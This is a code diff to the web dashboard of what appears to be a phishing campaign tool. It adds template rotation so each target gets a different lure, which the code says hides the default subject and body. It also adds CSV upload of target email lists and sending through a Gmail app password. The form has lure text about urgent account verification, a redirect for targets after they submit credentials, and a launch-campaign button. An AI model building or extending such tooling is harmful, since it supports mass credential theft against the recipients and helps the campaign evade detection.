@@ -37,14 +37,36 @@
             background: var(--bg);
             color: var(--text-body);
             display: flex;
-            min-height: 100vh;
+            height: 100vh;
             overflow: hidden;
+        }
+
+        /* Themed scrollbar — applies to all scrollable areas */
+        ::-webkit-scrollbar {
+            width: 4px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--bg);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--cyan);
+            border-radius: 2px;
+            box-shadow: 0 0 6px var(--cyan);
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--green);
         }
 
         /* ── SIDEBAR ───────────────────────────────────────── */
         .sidebar {
             width: 240px;
-            min-height: 100vh;
+            height: 100vh;
+            position: sticky;
+            top: 0;
+            overflow-y: auto;
             background: var(--bg2);
             border-right: 1px solid var(--border);
             display: flex;
@@ -52,7 +74,6 @@
             padding: 1.5rem 1.2rem;
             gap: 2rem;
             flex-shrink: 0;
-            position: relative;
         }
 
         .sidebar::after {
@@ -175,6 +196,7 @@
         /* ── MAIN CONTENT ──────────────────────────────────── */
         .main-content {
             flex: 1;
+            height: 100vh;
             overflow-y: auto;
             padding: 1.6rem 2rem;
         }
@@ -525,6 +547,9 @@
                 <a href="/analytics" class="nav-item">
                     <span class="nav-icon">◈</span> Analytics
                 </a>
+                <a href="/templates" class="nav-item">
+                    <span class="nav-icon">▣</span> Templates
+                </a>
                 <a href="/settings" class="nav-item">
                     <span class="nav-icon">◇</span> Settings
                 </a>
@@ -575,6 +600,53 @@
                             <input type="url" name="redirect_url" placeholder="https://microsoft.com/en-us/">
                             <label class="hint">Where targets land after submitting credentials</label>
                         </div>
+                        {% if templates %}
+                        <!-- Template mode toggle -->
+                        <div class="form-group"
+                            style="background:rgba(0,212,255,0.04); border:1px solid var(--border); border-radius:3px; padding:0.75rem 1rem; margin-bottom:0.9rem;">
+                            <div style="display:flex; align-items:center; justify-content:space-between;">
+                                <div>
+                                    <div style="font-size:0.75rem; color:var(--cyan); letter-spacing:1px;">// USE
+                                        TEMPLATE ROTATION</div>
+                                    <div
+                                        style="font-size:0.62rem; color:var(--text-secondary); margin-top:3px; letter-spacing:0;">
+                                        Each target gets a random template — hides default subject/body</div>
+                                </div>
+                                <label class="tpl-toggle-wrap"
+                                    style="position:relative; width:44px; height:22px; flex-shrink:0; cursor:pointer;">
+                                    <input type="checkbox" id="tplModeToggle"
+                                        style="opacity:0; width:0; height:0; position:absolute;">
+                                    <span class="tpl-toggle-slider" id="tplSlider"
+                                        style="position:absolute; inset:0; background:var(--bg3); border:1px solid var(--border); border-radius:22px; transition:0.25s;">
+                                        <span id="tplSliderDot"
+                                            style="position:absolute; width:14px; height:14px; background:var(--text-secondary); border-radius:50%; left:3px; top:3px; transition:0.25s;"></span>
+                                    </span>
+                                </label>
+                            </div>
+                        </div>
+
+                        <!-- Template picker (visible when toggle ON) -->
+                        <div id="tplPickerSection" style="display:none;">
+                            <div class="form-group">
+                                <label>SELECT TEMPLATES TO ROTATE</label>
+                                <div
+                                    style="display:flex; flex-direction:column; gap:0.4rem; max-height:150px; overflow-y:auto; padding:0.4rem; background:rgba(26,45,74,0.4); border:1px solid var(--border); border-radius:2px;">
+                                    {% for tpl in templates %}
+                                    <label
+                                        style="display:flex; align-items:center; gap:0.6rem; padding:0.3rem 0; border-bottom:1px solid rgba(30,58,95,0.4); color:var(--text-body); font-size:0.74rem; cursor:pointer; letter-spacing:0;">
+                                        <input type="checkbox" name="template_ids" value="{{ tpl.id }}"
+                                            style="width:auto; accent-color:var(--cyan);">
+                                        <span style="color:var(--green);">{{ tpl.name }}</span>
+                                        <span style="color:var(--text-secondary); font-size:0.65rem;">— {{ tpl.subject
+                                            }}</span>
+                                    </label>
+                                    {% endfor %}
+                                </div>
+                                <label class="hint">Check all templates you want to include in rotation</label>
+                            </div>
+                        </div>
+                        {% endif %}
+
                         <div class="form-group">
                             <label>GMAIL ADDRESS</label>
                             <input type="email" name="sender_email" required placeholder="your.email@gmail.com">
@@ -583,22 +655,63 @@
                             <label>APP PASSWORD</label>
                             <input type="password" name="sender_password" required placeholder="••••••••••••••••">
                         </div>
-                        <div class="form-group">
-                            <label>SUBJECT LINE</label>
-                            <input type="text" name="subject" required
-                                placeholder="Urgent: Account Verification Required">
+
+                        <!-- Default email fields (hidden when template mode ON) -->
+                        <div id="defaultEmailSection">
+                            <div class="form-group">
+                                <label>SUBJECT LINE</label>
+                                <input type="text" name="subject" id="subjectInput"
+                                    placeholder="Urgent: Account Verification Required">
+                            </div>
+                            <div class="form-group">
+                                <label>EMAIL BODY (HTML)</label>
+                                <textarea name="body" id="bodyInput" rows="5"
+                                    placeholder="Hello,&#10;&#10;Please verify your account.&#10;&#10;&#123;&#123;link&#125;&#125;"></textarea>
+                                <label class="hint">Use &#123;&#123;link&#125;&#125; to insert tracking link</label>
+                            </div>
                         </div>
+                        <!-- TARGET LIST with CSV upload -->
                         <div class="form-group">
-                            <label>EMAIL BODY (HTML)</label>
-                            <textarea name="body" rows="5" required
-                                placeholder="Hello,&#10;&#10;Please verify your account.&#10;&#10;{{link}}"></textarea>
-                            <label class="hint">Use &#123;&#123;link&#125;&#125; to insert tracking link</label>
-                        </div>
-                        <div class="form-group">
-                            <label>TARGET LIST</label>
-                            <textarea name="recipients" rows="5" required
-                                placeholder="target1@example.com&#10;target2@example.com"></textarea>
-                            <label class="hint">One email address per line</label>
+                            <div
+                                style="display:flex; align-items:center; justify-content:space-between; margin-bottom:0.5rem;">
+                                <label style="margin:0;">TARGET LIST</label>
+                                <div
+                                    style="display:flex; gap:0;
+                                    border:1px solid var(--border); border-radius:3px; overflow:hidden; font-size:0.65rem;">
+                                    <button type="button" id="tabManual" onclick="switchTab('manual')" style="padding:0.25rem 0.7rem; background:var(--cyan); color:var(--bg);
+                                               border:none; cursor:pointer; font-family:inherit; letter-spacing:1px;">
+                                        MANUAL
+                                    </button>
+                                    <button type="button" id="tabCsv" onclick="switchTab('csv')" style="padding:0.25rem 0.7rem; background:transparent; color:var(--text-secondary);
+                                               border:none; cursor:pointer; font-family:inherit; letter-spacing:1px;">
+                                        UPLOAD CSV
+                                    </button>
+                                </div>
+                            </div>
+
+                            <!-- Manual entry -->
+                            <div id="panelManual">
+                                <textarea id="recipientsInput" name="recipients" rows="5" required
+                                    placeholder="target1@example.com&#10;target2@example.com"></textarea>
+                                <label class="hint">One email address per line</label>
+                            </div>
+
+                            <!-- CSV upload -->
+                            <div id="panelCsv" style="display:none;">
+                                <label class="csv-drop-zone" id="csvDropZone" for="csvFileInput" style="display:flex; flex-direction:column; align-items:center; justify-content:center;
+                                           gap:0.4rem; border:1px dashed var(--border); border-radius:3px;
+                                           padding:1.4rem; cursor:pointer; text-align:center;
+                                           background:rgba(0,212,255,0.03); transition:0.2s;">
+                                    <span style="font-size:1.4rem;">&#x1F4C2;</span>
+                                    <span style="font-size:0.72rem; color:var(--cyan); letter-spacing:1px;">CLICK TO
+                                        SELECT CSV</span>
+                                    <span style="font-size:0.62rem; color:var(--text-secondary);">or drag &amp; drop —
+                                        must contain an email column</span>
+                                    <input type="file" id="csvFileInput" accept=".csv,.txt" style="display:none;">
+                                </label>
+                                <div id="csvStatus" style="margin-top:0.4rem; font-size:0.68rem;
+                                    color:var(--text-secondary); min-height:1.2em;"></div>
+                            </div>
                         </div>
                         <button type="submit" class="btn-launch">[ LAUNCH CAMPAIGN ]</button>
                     </form>
@@ -662,7 +775,167 @@
                 });
             });
         });
+
+        // ── Template rotation toggle ─────────────────────────────
+        const tplToggle = document.getElementById('tplModeToggle');
+        if (tplToggle) {
+            const picker = document.getElementById('tplPickerSection');
+            const defaults = document.getElementById('defaultEmailSection');
+            const slider = document.getElementById('tplSlider');
+            const dot = document.getElementById('tplSliderDot');
+            const subjInput = document.getElementById('subjectInput');
+            const bodyInput = document.getElementById('bodyInput');
+
+            function applyToggleState(on) {
+                if (on) {
+                    picker.style.display = 'block';
+                    defaults.style.display = 'none';
+                    // visually activate slider
+                    slider.style.background = 'rgba(0,212,255,0.15)';
+                    slider.style.borderColor = 'var(--cyan)';
+                    dot.style.transform = 'translateX(22px)';
+                    dot.style.background = 'var(--cyan)';
+                    dot.style.boxShadow = '0 0 6px var(--cyan)';
+                    // make subject/body optional since templates provide them
+                    if (subjInput) subjInput.removeAttribute('required');
+                    if (bodyInput) bodyInput.removeAttribute('required');
+                } else {
+                    picker.style.display = 'none';
+                    defaults.style.display = 'block';
+                    slider.style.background = 'var(--bg3)';
+                    slider.style.borderColor = 'var(--border)';
+                    dot.style.transform = 'translateX(0)';
+                    dot.style.background = 'var(--text-secondary)';
+                    dot.style.boxShadow = 'none';
+                    if (subjInput) subjInput.setAttribute('required', '');
+                    if (bodyInput) bodyInput.setAttribute('required', '');
+                }
+            }
+
+            tplToggle.addEventListener('change', () => applyToggleState(tplToggle.checked));
+            applyToggleState(false); // start with default fields visible
+        }
+
+        // ── CSV Upload ────────────────────────────────────────────
+        function switchTab(tab) {
+            const isManual = tab === 'manual';
+            document.getElementById('panelManual').style.display = isManual ? 'block' : 'none';
+            document.getElementById('panelCsv').style.display = isManual ? 'none' : 'block';
+
+            const tabM = document.getElementById('tabManual');
+            const tabC = document.getElementById('tabCsv');
+            tabM.style.background = isManual ? 'var(--cyan)' : 'transparent';
+            tabM.style.color = isManual ? 'var(--bg)' : 'var(--text-secondary)';
+            tabC.style.background = isManual ? 'transparent' : 'var(--cyan)';
+            tabC.style.color = isManual ? 'var(--text-secondary)' : 'var(--bg)';
+
+            const ta = document.getElementById('recipientsInput');
+            if (isManual) {
+                ta.setAttribute('required', '');
+            } else {
+                ta.removeAttribute('required');
+            }
+        }
+
+        function parseCSVEmails(text) {
+            const lines = text.split(/\r?\n/).map(l => l.trim()).filter(Boolean);
+            if (!lines.length) return [];
+
+            // Detect delimiter
+            const delim = lines[0].includes('\t') ? '\t' : ',';
+
+            const parseLine = l => l.split(delim).map(c => c.replace(/^"|"$/g, '').trim());
+
+            // Check if first row looks like a header
+            const firstCells = parseLine(lines[0]);
+            const emailColIdx = firstCells.findIndex(h =>
+                /^e-?mail(s)?$|^address$/i.test(h)
+            );
+
+            let dataLines = lines;
+            let colIdx = emailColIdx;
+
+            if (emailColIdx >= 0) {
+                // Has header with known email column — skip header row
+                dataLines = lines.slice(1);
+            } else {
+                // No header or unknown column — scan each cell for @
+                colIdx = -1;
+            }
+
+            const emails = [];
+            const seen = new Set();
+            const emailRe = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+            for (const line of dataLines) {
+                const cells = parseLine(line);
+                if (colIdx >= 0) {
+                    const e = cells[colIdx];
+                    if (e && emailRe.test(e) && !seen.has(e.toLowerCase())) {
+                        seen.add(e.toLowerCase());
+                        emails.push(e);
+                    }
+                } else {
+                    // scan all cells
+                    for (const cell of cells) {
+                        if (emailRe.test(cell) && !seen.has(cell.toLowerCase())) {
+                            seen.add(cell.toLowerCase());
+                            emails.push(cell);
+                        }
+                    }
+                }
+            }
+            return emails;
+        }
+
+        const csvInput = document.getElementById('csvFileInput');
+        const csvStatus = document.getElementById('csvStatus');
+        const csvDropZone = document.getElementById('csvDropZone');
+
+        function handleCSVFile(file) {
+            if (!file) return;
+            const reader = new FileReader();
+            reader.onload = function (e) {
+                const emails = parseCSVEmails(e.target.result);
+                const ta = document.getElementById('recipientsInput');
+                if (emails.length) {
+                    ta.value = emails.join('\n');
+                    csvStatus.style.color = 'var(--green)';
+                    csvStatus.textContent = `✓ ${emails.length} email${emails.length !== 1 ? 's' : ''} loaded from "${file.name}"`;
+                    csvDropZone.style.borderColor = 'var(--green)';
+                } else {
+                    csvStatus.style.color = 'var(--red)';
+                    csvStatus.textContent = '✗ No valid emails found — check your file has an email column';
+                    csvDropZone.style.borderColor = 'var(--red)';
+                }
+            };
+            reader.readAsText(file);
+        }
+
+        if (csvInput) {
+            csvInput.addEventListener('change', () => handleCSVFile(csvInput.files[0]));
+        }
+
+        // Drag & drop support
+        if (csvDropZone) {
+            csvDropZone.addEventListener('dragover', e => {
+                e.preventDefault();
+                csvDropZone.style.borderColor = 'var(--cyan)';
+                csvDropZone.style.background = 'rgba(0,212,255,0.08)';
+            });
+            csvDropZone.addEventListener('dragleave', () => {
+                csvDropZone.style.borderColor = 'var(--border)';
+                csvDropZone.style.background = 'rgba(0,212,255,0.03)';
+            });
+            csvDropZone.addEventListener('drop', e => {
+                e.preventDefault();
+                csvDropZone.style.borderColor = 'var(--border)';
+                csvDropZone.style.background = 'rgba(0,212,255,0.03)';
+                handleCSVFile(e.dataTransfer.files[0]);
+            });
+        }
     </script>
+
 </body>
 
 </html>
